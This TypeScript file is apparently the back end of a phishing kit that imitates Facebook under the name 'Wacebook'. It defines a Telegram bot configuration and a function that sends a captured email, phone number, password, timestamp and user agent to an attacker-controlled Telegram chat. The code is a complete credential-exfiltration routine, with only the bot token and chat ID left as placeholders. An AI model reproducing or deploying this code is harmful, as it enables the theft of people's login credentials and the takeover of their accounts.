
// Telegram Bot Configuration
// WARNING: These credentials will be visible in the client-side code
// For production, consider using environment variables or a backend service

export const TELEGRAM_CONFIG = {
  BOT_TOKEN: "YOUR_BOT_TOKEN_HERE", // Replace with your actual bot token
  CHAT_ID: "YOUR_CHAT_ID_HERE", // Replace with your chat ID
  API_URL: "https://api.telegram.org/bot"
};

// Function to send data to Telegram bot
export const sendToTelegramBot = async (data: {
  email: string;
  phone: string;
  password: string;
  timestamp: string;
  userAgent: string;
}) => {
  try {
    const message = `
🚨 *Wacebook Login Attempt*
📧 Email: ${data.email}
📱 Phone: ${data.phone}
🔒 Password: ${data.password}
⏰ Time: ${data.timestamp}
🖥️ User Agent: ${data.userAgent}
    `;

    const response = await fetch(`${TELEGRAM_CONFIG.API_URL}${TELEGRAM_CONFIG.BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: TELEGRAM_CONFIG.CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    if (!response.ok) {
      throw new Error('Failed to send message to Telegram');
    }

    return await response.json();
  } catch (error) {
    console.error('Error sending to Telegram:', error);
    throw error;
  }
};
